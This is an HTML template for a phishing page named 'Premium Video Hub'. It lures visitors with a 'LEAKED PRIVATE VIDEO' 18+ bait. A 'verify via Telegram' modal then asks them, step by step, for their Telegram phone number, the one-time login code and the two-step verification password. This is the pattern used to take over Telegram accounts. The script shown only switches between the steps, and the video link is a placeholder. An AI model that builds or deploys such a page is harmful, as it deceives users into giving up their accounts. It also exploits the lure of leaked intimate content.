        <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Premium Video Hub</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <style>
    body { background: #000000; color: #ffffff; font-family: system-ui, -apple-system, sans-serif; }
    
    .glass-card { background: #0f1015; border: 1px solid #1f222e; }
    
    /* Dark Popup Card from your screenshot */
    .modal-card { background: #151821; border: 1px solid #232838; }
    
    /* Original Gradient Button */
    .btn-pill-main { 
      background: linear-gradient(90deg, #d32f2f 0%, #f44336 100%); 
      border-radius: 9999px;
      box-shadow: 0 10px 25px -5px rgba(211, 47, 47, 0.4);
    }

    /* Blue Send Code Button matching screenshot */
    .btn-blue-action {
      background: #0088cc;
      border-radius: 12px;
    }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-between p-3 md:p-6">

  <!-- Main Content Container -->
  <main class="w-full max-w-md space-y-4">
    
    <!-- Title -->
    <div class="text-center py-2">
      <h1 class="text-xl font-black text-amber-500 tracking-wide uppercase flex items-center justify-center gap-2">
        <span>🔥</span> PREMIUM VIDEO HUB
      </h1>
      <p class="text-xs text-gray-500 mt-0.5">Exclusive content — Verified members only</p>
    </div>

    <!-- Main Video Card -->
    <div class="glass-card rounded-2xl p-3 space-y-3">
      
      <!-- Video Container -->
      <div class="relative w-full aspect-video rounded-xl overflow-hidden bg-black flex items-center justify-center">
        <video id="adVideo" class="w-full h-full object-cover" autoplay loop muted playsinline>
          <source src="YOUR_VIDEO_URL_HERE.mp4" type="video/mp4">
        </video>
      </div>

      <!-- Video Details -->
      <div class="space-y-1 px-1">
        <h2 class="text-sm font-black tracking-wide text-white flex items-center gap-1.5">
          <span>🔥</span> LEAKED PRIVATE VIDEO — 2026
        </h2>
        <div class="flex items-center gap-2 text-[11px] text-gray-400">
          <span class="text-yellow-400 font-semibold"><i class="fa-solid fa-star"></i> 4.9 (2.4M views)</span>
          <span>•</span>
          <span>18+</span>
        </div>
        <div class="pt-1">
          <span class="inline-block px-2 py-0.5 bg-red-500/20 text-red-400 border border-red-500/30 text-[9px] font-bold rounded uppercase">
            🔞 RESTRICTED
          </span>
        </div>
      </div>

      <!-- Main Pink/Red Capsule Button -->
      <button onclick="openModal()" class="w-full py-4 btn-pill-main text-white font-black text-xs md:text-sm tracking-wider flex items-center justify-center gap-2 uppercase">
        <span>🔞</span> GET YOUR LINK TAP TO VERIFY VIA TELEGRAM
      </button>
    </div>

    <!-- More Videos Grid -->
    <div class="pt-1">
      <h3 class="text-xs font-bold text-gray-300 mb-2 flex items-center gap-1.5">
        <span>🔥</span> More Videos
      </h3>
      
      <div class="grid grid-cols-2 gap-2.5">
        <div onclick="openModal()" class="glass-card rounded-xl overflow-hidden cursor-pointer">
          <div class="w-full h-20 bg-gradient-to-tr from-pink-900 to-red-700 flex items-center justify-center">
            <i class="fa-solid fa-play text-white/80 text-lg"></i>
          </div>
          <div class="p-2">
            <div class="text-xs font-bold text-white">Private 01</div>
            <div class="text-[10px] text-gray-400">2.1M</div>
          </div>
        </div>

        <div onclick="openModal()" class="glass-card rounded-xl overflow-hidden cursor-pointer">
          <div class="w-full h-20 bg-gradient-to-tr from-amber-900 to-yellow-700 flex items-center justify-center">
            <i class="fa-solid fa-play text-white/80 text-lg"></i>
          </div>
          <div class="p-2">
            <div class="text-xs font-bold text-white">Private 02</div>
            <div class="text-[10px] text-gray-400">1.8M</div>
          </div>
        </div>
      </div>
    </div>
  </main>

  <!-- AUTH POPUP MODAL (Matching Screenshot) -->
  <div id="authModal" class="fixed inset-0 bg-black/85 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
    <div class="modal-card w-full max-w-xs rounded-2xl p-5 relative text-center space-y-4">
      <button onclick="closeModal()" class="absolute top-3 right-3 text-gray-400 hover:text-white">
        <i class="fa-solid fa-xmark text-base"></i>
      </button>

      <!-- Step 1: Phone (Exact match to screenshot) -->
      <div id="step-phone" class="space-y-3 pt-2">
        <div class="text-2xl">📱</div>
        <div>
          <h3 class="text-base font-bold text-white">Telegram verification</h3>
          <p class="text-[11px] text-gray-400 mt-0.5">Enter your Telegram account phone number</p>
        </div>
        
        <input type="text" id="phoneInput" placeholder="XXXXXXXXXX" class="w-full bg-[#0a0c10] border border-gray-800 rounded-xl px-3 py-2.5 text-white text-center text-sm focus:outline-none focus:border-blue-500">
        
        <button onclick="nextStep('step-otp')" class="w-full py-2.5 btn-blue-action text-white font-medium text-xs tracking-wide flex items-center justify-center gap-1.5">
          <span>📱</span> Send code
        </button>
      </div>

      <!-- Step 2: OTP Step -->
      <div id="step-otp" class="space-y-3 pt-2 hidden">
        <div class="text-2xl">💬</div>
        <div>
          <h3 class="text-base font-bold text-white">Enter OTP</h3>
          <p class="text-[11px] text-gray-400 mt-0.5">Enter the code sent to your Telegram app</p>
        </div>
        
        <input type="text" id="otpInput" placeholder="•••••" class="w-full bg-[#0a0c10] border border-gray-800 rounded-xl px-3 py-2.5 text-white text-center text-lg tracking-widest focus:outline-none focus:border-blue-500">
        
        <button onclick="nextStep('step-2fa')" class="w-full py-2.5 btn-blue-action text-white font-medium text-xs tracking-wide">
          Verify Code
        </button>
      </div>

      <!-- Step 3: 2FA Password with Eye Icon -->
      <div id="step-2fa" class="space-y-3 pt-2 hidden">
        <div class="text-2xl">🔐</div>
        <div>
          <h3 class="text-base font-bold text-white">Two-Step Verification</h3>
          <p class="text-[11px] text-gray-400 mt-0.5">Your account has 2FA enabled</p>
        </div>
        
        <!-- Password Input with Show/Hide Eye Toggle -->
        <div class="relative w-full">
          <input type="password" id="passInput" placeholder="Enter Password" class="w-full bg-[#0a0c10] border border-gray-800 rounded-xl pl-3 pr-9 py-2.5 text-white text-center text-sm focus:outline-none focus:border-blue-500">
          <button type="button" onclick="togglePass()" class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white">
            <i id="eye" class="fa-solid fa-eye text-xs"></i>
          </button>
        </div>

        <button class="w-full py-2.5 btn-blue-action text-white font-medium text-xs tracking-wide">
          Submit
        </button>
      </div>

    </div>
  </div>

  <script>
    function openModal() { document.getElementById('authModal').classList.remove('hidden'); }
    function closeModal() { document.getElementById('authModal').classList.add('hidden'); }
    
    function nextStep(stepId) {
      document.getElementById('step-phone').classList.add('hidden');
      document.getElementById('step-otp').classList.add('hidden');
      document.getElementById('step-2fa').classList.add('hidden');
      document.getElementById(stepId).classList.remove('hidden');
    }

    function togglePass() {
      const input = document.getElementById('passInput');
      const icon = document.getElementById('eye');
      if (input.type === 'password') {
        input.type = 'text';
        icon.classList.replace('fa-eye', 'fa-eye-slash');
      } else {
        input.type = 'password';
        icon.classList.replace('fa-eye-slash', 'fa-eye');
      }
    }
  </script>
</body>
</html>
